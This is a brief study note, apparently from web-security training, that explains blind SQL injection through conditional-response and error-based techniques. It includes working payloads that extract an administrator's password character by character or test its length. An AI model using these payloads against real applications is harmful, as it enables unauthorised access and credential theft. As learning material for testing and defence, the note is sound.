# Blind SQLi
When the server application doesn't return database error or query results
Attacker can't see query output
Can be seen by side effects such as: Zero division, response time, etc. 

Conditional responses
	Use when the input is used in a conditional sentence 
	Ex:
		`' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

Error based 
	When response doen not change based on a conditional sentence => We force an error in the db if a condition is true 
	Ex:
		`' AND (SELECT CASE WHEN ( [condition to test] ) THEN 1/0 ELSE 'a' END)='a`

	select case when LENGTH((select password from users where username = 'administrator')) > 5 then 1/0 else 1 end 